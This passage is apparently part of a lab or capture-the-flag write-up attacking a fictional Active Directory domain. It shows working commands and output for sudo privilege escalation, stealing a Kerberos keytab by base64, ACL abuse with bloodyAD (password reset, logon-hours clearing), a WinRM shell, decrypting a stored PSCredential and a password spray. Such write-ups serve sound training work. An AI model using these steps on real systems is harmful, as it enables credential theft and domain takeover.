    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User d.reynolds may run the following commands on web:
    (ALL : ALL) ALL

d.reynolds@web:~$ sudo -i

root@web:~# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)

root@web:~# cat flag.txt
Flag03[WEB_0wned_via_Backup]
```

**Flag 3 — path one.** Plain old Linux privesc: reused password, sudo group, game over.

## 15.6 Bonus Loot — Keytabs Everywhere

```bash
root@web:~# find / -perm -u=s -type f 2>/dev/null

root@web:~# find / -perm -4000 2>/dev/null
```

### linpeas

```bash
╔══════════╣ Searching kerberos conf files and tickets (T1558.003)
```

> Check notes.md

Root on WEB also means linpeas runs with eyes. Two keytab finds:

**`/etc/krb5.keytab`** — the machine's own identity (`WEB$`, `host/WEB`) plus a service we've never met: **`HTTP/supportportal.westbridge.hsm`** — a hidden support portal SPN for the next stage.

**`/etc/svc_krb_t2.keytab`** — the *actual long-term key* of **svc_krb_t2**, the Tier-2 provisioning service account (the one with GenericAll over the IT TIER2 group). Exfil by base64 (it's tiny), then use it from the attacker box:

```bash
root@web:~# file /etc/svc_krb_t2.keytab
/etc/svc_krb_t2.keytab: Kerberos Keytab file, realm=WESTBRIDGE.HSM, principal=svc_krb_t2/, type=65536, date=Thu Jan  1 00:12:48 1970, kvno=18

root@web:~# md5sum /etc/svc_krb_t2.keytab
46a80173ad4532104c841adc1e035994  /etc/svc_krb_t2.keytab

root@web:~# base64 /etc/svc_krb_t2.keytab
BQIAAABLAAEADldFU1RCUklER0UuSFNNAApzdmNfa3JiX3QyAAAAAQAAAAADABIAIAAoC5VFjFon
nMRVXOxfD0nTD/LwVRwVW0SrQCvKd1pU


➜ echo 'BQIAAABLAAEADldFU1RCUklER0UuSFNNAApzdmNfa3JiX3QyAAAAAQAAAAADABIAIAAoC5VFjFon
nMRVXOxfD0nTD/LwVRwVW0SrQCvKd1pU' | base64 -d > svc_krb_t2.keytab

➜ file svc_krb_t2.keytab
svc_krb_t2.keytab: Kerberos Keytab file, realm=WESTBRIDGE.HSM, principal=svc_krb_t2/, type=65536, date=Thu Jan  1 00:12:48 1970, kvno=18

➜ md5sum svc_krb_t2.keytab
46a80173ad4532104c841adc1e035994  svc_krb_t2.keytab

➜ kinit -k -t svc_krb_t2.keytab svc_krb_t2@WESTBRIDGE.HSM

➜ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: svc_krb_t2@WESTBRIDGE.HSM

Valid starting       Expires              Service principal
08/23/2026 16:11:15  08/24/2026 02:11:15  krbtgt/WESTBRIDGE.HSM@WESTBRIDGE.HSM
        renew until 08/24/2026 16:11:15

➜ cp /tmp/krb5cc_1000 svc_krb_t2.ccache

➜ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: svc_krb_t2@WESTBRIDGE.HSM

Valid starting       Expires              Service principal
08/23/2026 16:11:15  08/24/2026 02:11:15  krbtgt/WESTBRIDGE.HSM@WESTBRIDGE.HSM
        renew until 08/24/2026 16:11:15

➜ cp /tmp/krb5cc_1000 svc_krb_t2.ccache

➜ klist svc_krb_t2.ccache
Ticket cache: FILE:svc_krb_t2.ccache
Default principal: svc_krb_t2@WESTBRIDGE.HSM

Valid starting       Expires              Service principal
08/23/2026 16:11:15  08/24/2026 02:11:15  krbtgt/WESTBRIDGE.HSM@WESTBRIDGE.HSM
        renew until 08/24/2026 16:11:15

➜ env KRB5CCNAME=svc_krb_t2.ccache \
nxc smb dc.westbridge.hsm -k --use-kcache
SMB         dc.westbridge.hsm 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         dc.westbridge.hsm 445    DC               [+] WESTBRIDGE.HSM\svc_krb_t2 from ccache
```

A full Kerberos identity for a Tier-2 account, no password ever cracked. (`sssd.conf` explains why the old key still works: `ad_maximum_machine_account_password_age = 0` — rotation disabled.)


### Why the keytab was there at all

This isn't random misconfiguration — it's the standard pattern for **Kerberos SSO on Linux**. Linux services can't run *as* AD service accounts, so anything Apache-hosted that needs Integrated Windows Authentication authenticates to AD through a **keytab** instead: the service account's long-term keys on disk, ready for `kinit -k`. During an internal migration project the university stood up `svc_krb_t2` as the dedicated service identity for exactly this purpose, installed its keytab on WEB, and planned to roll it out as the standard for all internal web applications. The rollout never finished — the keytab did. Which is why *"find every keytab on every domain-joined Linux box"* is such a reliable loot check: each one is a plaintext-equivalent domain identity, and here it handed us a Tier-2 provisioning account outright.

### Why it had GenericAll — a dead project's permissions

The account's excessive rights tell the same story from the AD side. When the migration deployed `svc_krb_t2`, the Infrastructure Services team delegated **GenericAll over the IT TIER2 group** so its automation could manage Tier-2 membership without bothering Domain Admins: temporarily elevate admins during maintenance windows, remove them afterwards, sync with the university's identity-management platform, auto-provision new Tier-2 staff at onboarding. Then the identity-management project was **abandoned** — and the delegation was never removed. The automation died; the permissions stayed.

That's not a lab contrivance, it's arguably *the* most common enterprise ACL finding: broad delegated rights granted for a deployment, outliving the deployment itself. Our whole attack chain keeps landing on this theme — the deprecated proxy config ([Section 3](#information-disclosure-people-directoryconfbak)), the never-rotated machine password (`ad_maximum_machine_account_password_age = 0`), and now a forgotten automation identity holding GenericAll over a tier boundary.

Who *is* svc_krb_t2 in the graph? Member of **TIER 2 PROVISIONING SERVICES**, and outbound:

![BloodHound — svc_krb_t2 group memberships](/assets/images/westbridge-bh-svckrbt2-membersof.png)
![BloodHound — svc_krb_t2 outbound control](/assets/images/westbridge-bh-svckrbt2-outbound.png)
![BloodHound — svc_krb_t2 GenericAll over IT TIER2](/assets/images/westbridge-bh-svckrbt2-genericall-tier2.png)

And what can svc_krb_t2 *write*? bloodyAD's `get writable` answers:

* **`OU=IT Tier2` — CREATE_CHILD; WRITE; OWNER: WRITE; DACL: WRITE** (matches its
  GenericAll over the IT TIER2 group — it can mint/modify Tier-2 identities)
* **CREATE_CHILD on the DNS zones — including `DC=westbridge-research.hsm`** —
  the *research forest's* DNS zone. Cross-forest staging rights, straight from a keytab
  we found on a web server.

## 15.7 Where This Leaves Us

| Host | Status | Flag |
|---|---|---|
| SQL 10.0.10.20 | SYSTEM | Flag01 |
| FILES 10.0.10.15 | local Administrator | Flag02 |
| WEB 10.0.10.10 | **root** (two independent paths) | **Flag03** |
| DC 10.0.10.5 | authenticated as 5+ identities | — |

Live threads into the endgame: `supportportal.westbridge.hsm` (new SPN), the **RESEARCH forest** (svc_krb_t2 can write its DNS), hidden **RID 9510**, `j.walsh`'s uncracked MD5, and Domain Admin on the DC itself.

# 16. HELPDESK-WS — The Tier-2 Play

## 16.1 Scanning the Hidden Workstation

The hostname brute in [Section 9.2.1](#finding-hidden-hosts-manually) already gave us the address; now it gets its scan:

```bash
PORT     STATE SERVICE       REASON  VERSION
3389/tcp open  ms-wbt-server syn-ack
| rdp-ntlm-info:
|   Target_Name: WESTBRIDGE
|   NetBIOS_Domain_Name: WESTBRIDGE
|   NetBIOS_Computer_Name: HELPDESK-WS
|   DNS_Domain_Name: westbridge.hsm
|   DNS_Computer_Name: HELPDESK-WS.westbridge.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-23T11:53:20+00:00
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=HELPDESK-WS.westbridge.hsm
| Issuer: commonName=HELPDESK-WS.westbridge.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-14T16:04:49
| Not valid after:  2027-01-13T16:04:49
| MD5:     e1fa d9a6 7466 9102 fcb6 bd61 34ce b72f
| SHA-1:   83e4 0847 2c50 c26e 7a0c 8ba3 0a36 ca3e 0e7f d225
| SHA-256: ff07 fa76 5d90 4eb6 0340 ec00 6ca3 7ed5 58ab 9f32 fb2e 4d2b ab01 2516 a2ba 9cfc
...[snip]...
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.991%I=7%D=8/23%Time=6A8ADF2E%P=x86_64-pc-linux-gnu%r(T
SF:erminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02
SF:\0\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
```

Hosts entry before touching it — Kerberos and WinRM both want the FQDN:

```
10.0.10.25    HELPDESK-WS.westbridge.hsm HELPDESK-WS
```

Exactly what a workstation should look like: **RDP + WinRM only**. No web, no database, nothing to exploit remotely — this box will be entered *as a user*, not attacked as a service. Which raises the question: which user?

## 16.2 svc_krb_t2 Mints Itself an OU

The keytab identity from [Section 15.6](#bonus-loot-keytabs-everywhere) holds GenericAll over the IT TIER2 group — but group membership alone doesn't put anyone in front of HELPDESK-WS. First, exercise that GenericAll into explicit ACE form (belt-and-braces for tooling that checks object ACLs rather than group rights):

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 -k ccache=./svc_krb_t2.ccache \
    add genericAll 'OU=IT Tier2,DC=WESTBRIDGE,DC=HSM' svc_krb_t2
[+] svc_krb_t2 has now GenericAll on OU=IT Tier2,DC=WESTBRIDGE,DC=HSM

# Reset the password of s.harrison — an IT TIER2 user
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 -k ccache=./svc_krb_t2.ccache \
    set password 's.harrison' 'SecretMyth123!'
[+] Password changed successfully!
```

Then the wall appears out of nowhere:

```bash
➜ nxc smb dc.westbridge.hsm \
    -u s.harrison -p 'SecretMyth123!'
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\s.harrison:SecretMyth123! STATUS_INVALID_LOGON_HOURS
```

## 16.3 Why "Invalid Logon Hours"? — Time-Based Access Control

AD accounts carry a **`logonHours` attribute**: 21 bytes = 168 bits, one bit per hour of the week, enforced by the KDC/domain controller at every authentication. A helpdesk-tier account like s.harrison had been provisioned with restricted hours — staff work 9-to-5, so the account is *only allowed to log on* 9-to-5, regardless of correct credentials.

And we were attacking at the wrong time of day. Password right, logon refused anyway: `STATUS_INVALID_LOGON_HOURS`.

Who fixes logon-hour policies? The group we've been sitting next to since [Section 12](#mapping-the-ous-who-lives-where):

![BloodHound — Account Policy Administrators control IT Tier2 settings incl. logon restrictions](/assets/images/westbridge-bh-accountpolicy-logonhours.png)

**Account Policy Administrators** — c.wilson's group from our very first password reset. Its purpose, per the graph: managing account policy for IT TIER2 users, *"including logon restrictions and account settings"*. We reset c.wilson's password back then and never used it. Now it's exactly the right hammer.

(And why does the restriction exist at all? Same dead-migration pattern as before: Tier-2 staff accounts are provisioned conservatively — limited hours, standard-user defaults — and nobody revisits those settings when roles change. The policy isn't protecting anything anymore; it's just still there.)

## 16.4 Clearing the Hours — and Why Attempt #1 Failed

First look at what we're overwriting:

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    get object 's.harrison' \
    --attr logonHours --raw

distinguishedName: CN=s.harrison,OU=IT Tier2,DC=westbridge,DC=hsm
logonHours: AAAAAAAAAAAAAP8BAAAAAAAAAAAA
```

```bash
➜ echo '////////////////////////////' | base64 -d | xxd
00000000: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000010: ffff ffff ff                             .....
```

21 bytes of mostly-zero with one stray nibble — a bitmap where each bit is one hour of the week. All-zeros (`AAAAAAAAAAAAAAAAAAAAAAAA`) means "never"; all-ones (`////////////////////////////`, base64 for 21×`\xFF`) means "always". We want all-ones:

```bash
# ATTEMPT 1 — FAILS
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    set object 's.harrison' 'logonHours' \
    -v '////////////////////////////' --raw

badldap.commons.exceptions.LDAPModifyException: unwillingToPerform for CN=s.harrison,OU=IT Tier2,DC=westbridge,DC=hsm (Attr) — Reason:(ERROR_NOT_SUPPORTED) The request is not supported.

➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    set object 's.harrison' 'logonHours' \
    -v '////////////////////////////' --b64
[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
[+] s.harrison's logonHours has been updated

➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    get object 's.harrison' \
    --attr logonHours --raw

distinguishedName: CN=s.harrison,OU=IT Tier2,DC=westbridge,DC=hsm
logonHours: ////////////////////////////
```

Why did it fail? Because `-v <value> --raw` tells bloodyAD to write the string `////////////////////////////` as a **single LDAP string value**. But AD defines `logonHours` with syntax **`OctetString`** — a fixed 21-byte binary blob. When the server receives a modify against an octet-string attribute carrying a non-octet-encoded value, it rejects the whole operation as `unwillingToPerform / ERROR_NOT_SUPPORTED` rather than guessing an encoding.

The working form drops the value entirely — `set object ... --raw` with no `-v` instructs bloodyAD to push its own canonical all-`FF` octet string (the "remove all restrictions" preset):

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    set object 's.harrison' 'logonHours' --raw
[+] s.harrison's logonHours has been updated

➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    get object 's.harrison' \
    --attr logonHours --raw

distinguishedName: CN=s.harrison,OU=IT Tier2,DC=westbridge,DC=hsm

# And now the login lands:
➜ nxc smb dc.westbridge.hsm \
    -u s.harrison -p 'SecretMyth123!'
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\s.harrison:SecretMyth123!
```

Lesson: when writing binary AD attributes, either supply proper octet encoding or use your tooling's raw/preset mode — a plain-text value against an OctetString attribute will always bounce with ERROR_NOT_SUPPORTED.

## 16.5 Who Is s.harrison?

![BloodHound — s.harrison memberships](/assets/images/westbridge-bh-sharrison-membersof.png)

BloodHound shows s.harrison sitting in two groups that matter for this engagement:

* **Helpdesk Technicians** — the helpdesk-tier identity, consistent with a Tier-2 provisioner account that's been provisioned conservatively (limited logon hours, standard-user defaults). This is the group whose logon-hour restriction bit us in [Section 16.3](#163-why-invalid-logon-hours-time-based-access-control).
* **HelpDesk Workstation Admins** — the door key. This group exists precisely to administer machines like `HELPDESK-WS$` (10.0.10.25 — RDP/WinRM only). It's what turns a valid helpdesk credential into a workstation foothold.

The BloodHound graph also shows s.harrison's outbound edges — limited for a helpdesk-tier account, but the Workstation Admins membership is the one that matters.

LDAP confirms the same picture:
➜ nxc ldap dc.westbridge.hsm \
    -u s.harrison -p 'SecretMyth123!' \
    --groups

...[snip]...
LDAP        10.0.10.5       389    DC               Helpdesk Technicians                     1         Responsible for handling IT support tickets and user requests through the IT Support Portal.
...[snip]...
LDAP        10.0.10.5       389    DC               HelpDesk Workstation Admins              1
```

That second membership is the door key: **HelpDesk Workstation Admins** exists precisely to administer machines like `HELPDESK-WS$` (10.0.10.25 — RDP/WinRM only).

## 16.6 Foothold — Protocol Matrix, Then WinRM

Same ritual as every new credential — re-test every protocol against the new target:

```bash
➜ for proto in smb ldap winrm rdp; \
    do nxc $proto helpdesk-ws.westbridge.hsm -u s.harrison -p 'SecretMyth123!'; \
    echo '---';
done
---
---
WINRM       10.0.10.25      5985   HELPDESK-WS      [*] Windows 11 / Server 2025 Build 26100 (name:HELPDESK-WS) (domain:westbridge.hsm)
WINRM       10.0.10.25      5985   HELPDESK-WS      [+] westbridge.hsm\s.harrison:SecretMyth123! (Pwn3d!)
---
RDP         10.0.10.25      3389   HELPDESK-WS      [*] Windows 10 or Windows Server 2016 Build 26100 (name:HELPDESK-WS) (domain:westbridge.hsm) (nla:True)
RDP         10.0.10.25      3389   HELPDESK-WS      [+] westbridge.hsm\s.harrison:SecretMyth123! (Pwn3d!)
```

Both interactive protocols light up **`(Pwn3d!)`** — the Workstation Admins membership does exactly what its name promised. Straight into WinRM:

```bash
➜ evil_winrmexec \
    westbridge.hsm/s.harrison:'SecretMyth123!'@helpdesk-ws.westbridge.hsm

PS C:\Users\s.harrison\Documents> whoami; hostname
westbridge\s.harrison
HELPDESK-WS
```

```bash
PS C:\Users\s.harrison> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

The privilege list reads like a local-admin greatest-hits — `SeDebugPrivilege`, `SeBackupPrivilege`/`SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, `SeImpersonatePrivilege` all enabled. Any one of several of these is a local SYSTEM escalation if we ever need one (DiskShadow/vssadmin dump, load-driver abuse, potato variants). No need today — the flag is just sitting on the admin's desktop:

```
PS > type C:\Users\Administrator\Desktop\flag.txt
Flag04[HELPDESK_AdminShell]
```


```bash
PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/1/2024   7:02 AM                PerfLogs
d-r---        11/14/2024   1:26 AM                Program Files
d-r---          4/1/2024   8:16 AM                Program Files (x86)
d-----         7/15/2026   4:37 PM                Support
d-r---         7/15/2026   4:22 PM                Users
d-----         8/23/2026   9:38 AM                Windows
```

```bash
PS C:\Users\s.harrison> tree . /a /f
Folder PATH listing for volume Windows
Volume serial number is 7EC2-1A39
C:\USERS\S.HARRISON
+---Contacts
+---Desktop
|       Microsoft Edge.lnk
|       ShellRunas.exe
|       Support Portal.url
|
+---Documents
+---Downloads
+---Favorites
\---Pictures
```

```bash
PS C:\support> tree . /a /f
Folder PATH listing for volume Windows
Volume serial number is 7EC2-1A39
C:\SUPPORT
+---Documentation
|       Cybersecurity_Guidelines_2026.pdf
|       New Employee Checklist.docx
|
+---Scripts
|   +---ActiveDirectory
|   |       Collect-SystemInfo.ps1
|   |       domain_defaultPW.xml
|   |       Get-ComputerInfo.ps1
|   |       Get-DomainUserInfo.ps1
|   |       Get-GroupMembership.ps1
|   |       Get-InstalledPrinters.ps1
|   |       Open-SupportPortal.ps1
|   |       Reset-DomainDefaultPassword.ps1
|   |       Test-DomainConnectivity.ps1
|   |       Unlock-UserAccount.ps1
|   |
|   +---Software
|   |       Deploy-NTRights.ps1
|   |       Install-7Zip.ps1
|   |       Install-SQLExpress.ps1
|   |       Install-VLC.ps1
|   |       Test-DeploymentShare.ps1
|   |
|   \---Workstations
|           Clear-PrintQueue.ps1
|           Collect-SystemInfo.ps1
|           Enable-RDP.ps1
|           GPUpdate.ps1
|           Install-Printer.ps1
|           Install-RSAT.ps1
|           Join-Domain.ps1
|           Rename-Computer.ps1
|           Restart-RemotePC.ps1
|
\---Tools
    |   Autologon.exe
    |   putty.exe
    |   WinSCP-6.5.6-Setup.exe
    |
    \---Sysinternals
        +---Autoruns
        |       Autoruns.exe
        |       Autoruns64.exe
        |       Autoruns64a.exe
        |       autorunsc.exe
        |       autorunsc64.exe
        |       autorunsc64a.exe
        |       Eula.txt
        |
        +---ProcessExplorer
        |       Eula.txt
        |       procexp.exe
        |       procexp64.exe
        |       procexp64a.exe
        |
        +---PSTools
        |       Eula.txt
        |       PsExec.exe
        |       PsExec64.exe
        |       psfile.exe
        |       psfile64.exe
        |       PsGetsid.exe
        |       PsGetsid64.exe
        |       PsInfo.exe
        |       PsInfo64.exe
        |       pskill.exe
        |       pskill64.exe
        |       pslist.exe
        |       pslist64.exe
        |       PsLoggedon.exe
        |       PsLoggedon64.exe
        |       psloglist.exe
        |       psloglist64.exe
        |       pspasswd.exe
        |       pspasswd64.exe
        |       psping.exe
        |       psping64.exe
        |       PsService.exe
        |       PsService64.exe
        |       psshutdown.exe
        |       psshutdown64.exe
        |       pssuspend.exe
        |       pssuspend64.exe
        |       Pstools.chm
        |       psversion.txt
        |
        \---ShellRunas
                Eula.txt
                ShellRunas.exe
```

## 16.7 Looking Around — the Support Portal

```bash
➜ xfreerdp3 /u:'s.harrison' /v:10.0.10.25 /p:'SecretMyth123!' /dynamic-resolution +clipboard
```

The workstation's filesystem is a helpdesk toolbox (`C:\Support\Scripts\` full of AD one-liners like `Unlock-UserAccount.ps1`, `Reset-DomainDefaultPassword.ps1`, `domain_defaultPW.xml` — noted for later), and s.harrison's desktop has a shortcut: **Support Portal**. The `HTTP/supportportal.westbridge.hsm` SPN from WEB's keytab ([Section 15.6](#bonus-loot-keytabs-everywhere)) finally gets a face.

RDP session, portal sign-in as s.harrison:

![Support Portal — login](/assets/images/westbridge-supportportal-login.png)

![Support Portal — tickets](/assets/images/westbridge-supportportal-tickets.png)

The **Team Chat** is where it gets interesting:

![Support Portal — chat with the Research Operator](/assets/images/westbridge-supportportal-chat-clue.png)

```
Research Operator
Hey, I'm trying to add myself to the "Research Web Operations" group.
But I keep getting an error: "The group membership cannot be added because
the group scope is not compatible."

S. Harrison
Hmm, that sounds like a scope issue. What's the current group scope?

Research Operator
It's set to Global right now.

S. Harrison
Since you're trying to add yourself from a different domain context, you need
to change the group scope to Universal first, then to Domain Local.
That should resolve the membership issue and let you add yourself to the group.
```

Read this against everything we know:

* The **Research Operator** account chats *from the other side of the trust* — this is our
  `researchoperator` user from the very first LDAP dump, living in `WESTBRIDGE-RESEARCH.HSM`.
* They're trying to join a **cross-domain group** ("Research Web Operations"), and the
  failure is pure **AD group-scope mechanics**: a Global group can't contain members from
  another domain; Global ➜ Universal ➜ Domain Local is exactly the migration path for
  making a group accept cross-domain members.
* Harrison's answer isn't small talk — it's a **roadmap**. Somewhere in the directory there
  is a group whose scope is mid-conversion (or about to be), and once it lands at Domain
  Local, accounts from the research forest can walk into `westbridge.hsm` through it.

That's the endgame thread: the trust we flagged in [Section 9.1](#a-second-forest), the `researchoperator` oddball from [Section 5.2](#what-we-got), and this chat are all pointing at the same door. When we're ready to cross into the research forest, the entry ticket may literally be a group-scope change.


Also worth noting from the same session: the portal's ticket list shows mundane helpdesk traffic, but one thread mentions *"Logon ho..."* — likely the logon-hours restriction we just cleared. The lab's stories keep matching its mechanics.

**Flag 4 captured.** Three hosts fully owned, the fourth (DC) authenticated-into half a dozen ways — and every step of this stage was pure directory manipulation: no exploit, no brute force, just the domain's own permission model used exactly as designed, by someone it was never meant to let in.

| Host | Status | Flag |
|---|---|---|
| SQL 10.0.10.20 | SYSTEM | Flag01 |
| FILES 10.0.10.15 | local Administrator | Flag02 |
| WEB 10.0.10.10 | root | Flag03 |
| **HELPDESK-WS 10.0.10.25** | **local admin via s.harrison** | **Flag04** |
| DC 10.0.10.5 | authenticated, no shell yet | — |

# 17. a.pherson — Resurrecting the Dead

## 17.1 The Default-Password Trail

The helpdesk toolbox on HELPDESK-WS (`C:\Support\Scripts\`) held a gem: `domain_defaultPW.xml` — a PowerShell `PSCredential` object. `Import-Clixml` + a `GetNetworkCredential().Password` read later:

```bash
PS C:\Support\Scripts\ActiveDirectory> dir


    Directory: C:\Support\Scripts\ActiveDirectory


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/15/2026   2:21 PM            308 Collect-SystemInfo.ps1
-a----         7/15/2026   4:26 PM           1852 domain_defaultPW.xml
-a----         7/15/2026   2:21 PM            255 Get-ComputerInfo.ps1
-a----         7/15/2026   2:21 PM           1313 Get-DomainUserInfo.ps1
-a----         7/15/2026   2:20 PM            290 Get-GroupMembership.ps1
-a----         7/15/2026   2:20 PM            146 Get-InstalledPrinters.ps1
-a----         7/15/2026   2:20 PM            153 Open-SupportPortal.ps1
-a----         7/15/2026   2:19 PM           1187 Reset-DomainDefaultPassword.ps1
-a----         7/15/2026   2:19 PM            231 Test-DomainConnectivity.ps1
-a----         7/15/2026   2:19 PM            317 Unlock-UserAccount.ps1


PS C:\Support\Scripts\ActiveDirectory> cat domain_defaultPW.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">DefaultPassword</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000004a6e558d24b86e4d8ebf99584b7b3b6c00000000020000000000106600000001000020000000761ba7c084a30f81b16e6b4a03ab3787d2ed0de1f9abaab26a6261449b7aa49b000000000e80000000020000200000003241c8ecf8c79efdfd37f84009af80c67d68dfab4faf5edef68d41570681817a30000000eafef4f2d095ab18c559c7f9b04e2d0bef88fa6a03daa14956f2daf07575955ae675254eab726fc9be10c49ad8fad5ab40000000dc450aa4f887f925cc97cb7e20cfc4f71d1f0641ae7a749cc98fa9ae54d4e82f95a31c06cfafe2df2c176eca5644d26f77e2a0e4219763b20db2d519ac353c78</SS>
    </Props>
  </Obj>
</Objs>

PS C:\Support\Scripts\ActiveDirectory> $cred = Import-Clixml -Path "C:\Support\Scripts\ActiveDirectory\domain_defaultPW.xml"
PS C:\Support\Scripts\ActiveDirectory> $cred.GetNetworkCredential().Password
Welcome2Westbridge!
```

Sprayed across the estate — one hit, and it's a strange one:

```bash
➜ nxc smb dc.westbridge.hsm \
    -u 'users.txt' -p 'Welcome2Westbridge!' \
    --continue-on-success
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\Administrator:Welcome2Westbridge! STATUS_ACCOUNT_RESTRICTION
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\Guest:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\krbtgt:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\m.thompson:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\r.anderson:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\c.wilson:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\d.parker:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\s.harrison:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\svc_legacy:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\svc_mssql:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\o.carter:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\n.brooks:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\e.foster:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\l.reed:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\c.ward:Welcome2Westbridge! STATUS_LOGON_FAILURE
